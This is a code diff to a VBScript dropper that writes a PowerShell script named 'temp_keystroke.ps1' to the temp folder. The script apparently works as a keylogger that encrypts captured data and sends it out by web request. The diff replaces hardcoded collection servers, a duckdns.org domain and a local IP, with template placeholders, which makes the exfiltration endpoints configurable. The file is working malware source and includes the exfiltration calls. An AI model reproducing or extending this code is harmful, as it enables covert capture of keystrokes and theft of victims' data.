@@ -2,6 +2,14 @@
 Dim objShell
 Set objShell = WScript.CreateObject("WScript.Shell")
 
+' Parameters
+Dim sending_base
+sending_base = "{{SENDING_BASE}}"
+Dim base_url
+base_url = "{{BASE_URL}}"
+Dim key
+key = "{{KEY}}"
+
 ' Create a temporary PowerShell script with initial commands
 Dim tempPSFilePath, cleanupPSFilePath
 tempPSFilePath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\temp_keystroke.ps1"
@@ -17,9 +25,10 @@ tempPSFile.WriteLine("#---------------------------------------------------------
 tempPSFile.WriteLine("#                                                   Variables Definition")
 tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
 tempPSFile.WriteLine("# Web server for processing string data")
-tempPSFile.WriteLine("$sending_base = 'https://rapid.tlnas.duckdns.org/process.php'")
+tempPSFile.WriteLine("$sending_base = '" & sending_base & "'")
 tempPSFile.WriteLine("# Webserver for getting public key")
-tempPSFile.WriteLine("$key = 'https://rapid.tlnas.duckdns.org/get_public_key.php'")
+tempPSFile.WriteLine("$key = '" & key & "'")
+tempPSFile.WriteLine("$base_url = '" & base_url & "'")
 tempPSFile.WriteLine("$cleanupScriptPath = '" & cleanupPSFilePath & "'")
 
 tempPSFile.WriteLine("#---------------------------------------------------------------------------------------------------------------------")
@@ -51,7 +60,7 @@ tempPSFile.WriteLine("$completed = $false")
 
 tempPSFile.WriteLine("if (Is_Connected -ne $null) {")
 tempPSFile.WriteLine("    try {")
-tempPSFile.WriteLine("        $response = Invoke-WebRequest -Uri http://10.0.0.1:8000/ -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'")
+tempPSFile.WriteLine("        $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'")
 tempPSFile.WriteLine("        $uuid = ($response.content | ConvertFrom-Json).uuid")
 tempPSFile.WriteLine("        $completed = $true")
 tempPSFile.WriteLine("    } catch {}")
@@ -123,7 +132,7 @@ tempPSFile.WriteLine("                    $completed = $false")
 
 tempPSFile.WriteLine("                    while (-not $completed) {")
 tempPSFile.WriteLine("                        try {")
-tempPSFile.WriteLine("                            $response = Invoke-WebRequest -Uri http://10.0.0.1:8000/ -Method POST -Body ($data | ConvertTo-Json) -ContentType 'application/json'")
+tempPSFile.WriteLine("                            $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($data | ConvertTo-Json) -ContentType 'application/json'")
 tempPSFile.WriteLine("                            Write-Host 'Sending data'")
 tempPSFile.WriteLine("                            # Sending data to Webserver")
 tempPSFile.WriteLine("                            Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content | ConvertTo-Json) -ContentType 'application/json'")
